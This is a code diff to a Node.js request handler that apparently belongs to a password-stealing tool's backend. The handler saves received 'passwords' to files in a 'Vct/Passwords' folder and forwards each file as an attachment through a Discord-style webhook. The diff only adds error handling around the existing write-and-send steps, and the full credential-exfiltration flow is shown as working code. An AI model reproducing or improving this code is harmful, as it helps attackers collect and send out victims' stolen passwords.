@@ -21,17 +21,22 @@ module.exports = async (req, res) => {
         const randomstringg = crypto.randomBytes(5).toString('hex');
         const content = passwords;
 
-        await fs.writeFile(`./Vct/Passwords/${randomstringg}.txt`, content);
+        try {
+            await fs.writeFile(`./Vct/Passwords/${randomstringg}.txt`, content);
 
-        const webhookClient = new WebhookClient({ url: webhook });
-        await webhookClient.send({
-            files: [{
-                attachment: `./Vct/Passwords/${randomstringg}.txt`,
-                name: `${randomstringg}password.txt`
-            }]
-        });
+            const webhookClient = new WebhookClient({ url: webhook });
+            await webhookClient.send({
+                files: [{
+                    attachment: `./Vct/Passwords/${randomstringg}.txt`,
+                    name: `${randomstringg}password.txt`
+                }]
+            });
 
-        return res.sendStatus(200);
+            return res.sendStatus(200);
+        } catch (err) {
+            console.error(err);
+            return res.status(500).json({ error: 'Internal Server Error' });
+        }
     } catch (err) {
         console.error(err);
         return res.status(500).json({ error: 'Internal Server Error' });
